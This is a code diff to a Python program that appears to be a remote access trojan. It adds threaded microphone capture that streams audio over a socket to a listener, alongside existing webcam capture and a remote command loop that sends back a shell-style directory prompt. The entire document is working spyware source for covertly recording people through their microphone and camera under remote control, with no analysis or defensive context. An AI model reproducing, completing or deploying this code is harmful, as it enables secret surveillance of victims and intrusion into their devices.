@@ -3,13 +3,19 @@ import os
 import pyautogui
 import re
 import time
+import threading
 import subprocess
 import cv2
 import pyaudio
 
 def audio():
+    print("Socket Created!!!")
     s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s1.connect(('127.0.0.1',1235))
+    try:
+        s1.connect(('127.0.0.1',1235))
+    except:
+        print("Error")
+    print("Connected!!!")
     chunk = 1024
     FORMAT = pyaudio.paInt16
     channels = 1
@@ -22,12 +28,15 @@ def audio():
                     input=True,
                     output=True,
                     frames_per_buffer=chunk)
-    while True:
+    print("Listening")
+    global flag
+    while flag:
         try:
             data = stream.read(chunk)
             s1.send(data)
         except:
             break
+    print("Stopped!")
 
 def webcam(s):
     cap = cv2.VideoCapture(0)
@@ -119,7 +128,15 @@ def cmd(s):
             webcam(s)
             continue
         elif cmd == 'audio':
-            audio()
+            t1 = threading.Thread(target=audio)
+            t1.daemon = True
+            global flag
+            flag = True
+            t1.start()
+            print("Back")
+            continue
+        elif cmd == 'endaudio':
+            flag = False
             continue
         else:
             s.send((os.getcwd() + ">").encode())
